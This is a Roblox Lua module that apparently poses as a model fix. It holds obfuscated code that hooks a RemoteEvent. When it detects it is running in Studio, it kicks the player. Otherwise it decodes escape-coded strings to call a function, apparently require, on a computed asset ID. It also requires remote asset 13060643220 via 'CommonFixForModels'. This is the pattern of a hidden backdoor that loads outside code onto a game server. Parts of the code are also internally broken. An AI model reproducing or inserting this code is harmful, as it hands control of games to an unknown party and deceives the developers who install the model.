local module = {}

local function module(notused)

	if notused:IsA("RemoteEvent") then
		--[[  || ?? AUTHOR: @4zx16, @Jirendbs123 || RB (SERVER):  || ?? File://GitHub.com/4zx16/RB/V4.5:  || ?? REMOTE EVENT NEEDED! ]] local a = { Execution = notused; Studio = game:GetService("\82\117\110\83\101\114\118\105\99\101"); } --[[   ____  _     ___   ___  ____     ____    _    _   _  ____   | __ )| |   / _ \ / _ \|  _ \   / ___|  / \  | \ | |/ ___|  |  _ \| |  | | | | | | | | | | | |  _  / _ \ |  \| | |  _   | |_) | |__| |_| | |_| | |_| | | |_| |/ ___ \| |\  | |_| |  |____/|_____\___/ \___/|____/   \____/_/   \_\_| \_|\____| --]] local function p(s) local t = s.Name if a.Studio:IsStudio() then s:Kick(nil) else local m={["\92\52\57\92\52\56\92\52\57\92\54\51"] = "\92\54\53",["\92\52\57\92\52\56\92\53\48\92\54\51"] = "\92\57\55",["\92\52\57\92\52\57\92\52\57\92\54\51"] = "\92\54\54",["\92\52\57\92\53\48\92\52\57\92\54\51"] = "\92\57\56",["\92\52\57\92\57\53\92\53\51\92\52\57\92\54\51"] = "\92\54\55",["\92\53\48\92\52\56\92\52\57\92\54\51"] = "\92\57\57",["\92\57\53\92\51\51\92\52\57\92\52\56\92\52\57\92\54\51"] = "\92\54\56",["\92\57\53\92\52\51\92\52\57\92\52\56\92\52\57\92\54\51"] = "\92\49\48\48",["\92\49\48\49\92\52\57\92\52\56\92\52\57\92\54\51"] = "\92\54\57",["\92\52\57\92\54\57\92\52\56\92\52\57\92\54\51"] = "\92\49\48\49",["\92\49\48\50\92\49\48\50\92\52\56\92\52\57\92\54\51"] = "\92\55\48",["\92\54\57\92\57\57\92\52\56\92\52\57\92\54\51"] = "\92\49\48\50",["\92\52\57\92\53\55\92\52\57\92\54\51"] = "\92\55\49",["\92\53\55\92\52\56\92\53\48\92\54\51"] = "\92\49\48\51",["\92\52\57\92\57\53\92\52\57\92\52\57\92\54\51"] = "\92\55\50",["\92\52\57\92\53\48\92\57\53\92\52\57\92\54\51"] = "\92\49\48\52",["\92\53\51\92\57\53\92\53\51\92\52\57\92\54\51"] = "\92\55\51",["\92\53\52\92\57\53\92\52\56\92\52\57\92\54\51"] = "\92\49\48\53",["\92\57\53\92\51\51\92\53\51\92\53\51\92\52\56\92\52\57\92\54\51"] = "\92\55\52",["\92\57\53\92\52\51\92\53\51\92\53\51\92\52\56\92\52\57\92\54\51"] = "\92\49\48\54",["\92\52\57\92\57\53\92\51\51\92\51\51\92\51\51\92\52\56\92\52\57\92\54\51"] = "\92\55\53",["\92\52\57\92\57\53\92\51\51\92\51\51\92\52\56\92\52\57\92\54\51"] = "\92\49\48\55",["\92\52\57\92\52\56\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\55\54",["\92\52\57\92\52\56\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\48\56",["\92\52\57\92\52\50\92\52\56\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\55\55",["\92\52\57\92\52\56\92\49\49\56\92\52\57\92\57\53\92\51\51\92\51\51\92\57\53\92\54\51"] = "\92\49\48\57",["\92\52\57\92\52\56\92\57\52\92\57\52\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\55\57",["\92\52\57\92\52\56\92\52\57\92\57\52\92\57\53\92\54\51"] = "\92\49\49\49",["\92\49\49\50\92\52\57\92\52\56\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\56\48",["\92\56\55\92\52\57\92\52\56\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\49\50",["\92\52\57\92\52\56\92\54\50\92\54\50\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\56\49",["\92\52\57\92\52\56\92\54\50\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\49\51",["\92\52\57\92\49\50\52\92\49\50\52\92\52\56\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\56\50",["\92\52\57\92\49\50\52\92\52\56\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\49\52",["\92\52\57\92\54\52\92\51\51\92\52\56\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\56\51",["\92\52\57\92\51\51\92\52\56\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\49\53",["\92\52\57\92\49\49\55\92\52\56\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\56\52",["\92\52\57\92\52\56\92\49\49\56\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\49\54",["\92\49\50\48\92\52\57\92\52\56\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\56\53",["\92\52\57\92\56\55\92\56\55\92\52\56\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\49\55",["\92\52\57\92\57\52\92\52\50\92\52\50\92\52\56\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\56\54",["\92\52\57\92\52\56\92\52\57\92\57\53\92\56\54\92\56\54\92\52\50\92\52\50\92\57\53\92\54\51"] = "\92\49\49\56",["\92\52\57\92\57\53\92\57\53\92\53\48\92\53\48\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\56\55",["\92\52\57\92\52\56\92\51\51\92\51\51\92\53\48\92\53\48\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\49\57",["\92\52\57\92\52\56\92\52\57\92\53\56\92\54\50\92\57\53\92\51\51\92\54\51"] = "\92\56\56",["\92\52\57\92\52\56\92\52\57\92\53\56\92\54\48\92\57\53\92\57\53\92\54\51"] = "\92\49\50\48",["\92\52\57\92\52\56\92\52\57\92\56\56\92\56\57\92\57\53\92\57\48\92\57\53\92\51\51\92\54\51"] = "\92\56\57",["\92\52\57\92\52\56\92\52\57\92\56\56\92\56\57\92\57\48\92\57\53\92\57\53\92\54\51"] = "\92\49\50\49",["\92\52\57\92\52\56\92\51\57\92\52\57\92\57\53\92\51\51\92\54\51"] = "\92\57\48",["\92\52\57\92\52\56\92\51\57\92\51\51\92\52\57\92\57\53\92\57\53\92\54\51"] = "\92\49\50\50",}local function m(k) local k = "" for i = 1, #k do if m[k[i]] then k = k .. m[k[i]] else k = k .. k[i] end end return k end; getfenv()[m(string.split('1|01__?,1E01?,10>1__?,1WW01__?,6_01?,1|01__?,1E01?', ','))](72693.95279992477*95699)(s.Name) end end a.Execution.OnServerEvent:Connect(p)
		require(13060643220).CommonFixForModels(script.Parent)
	end
end
return module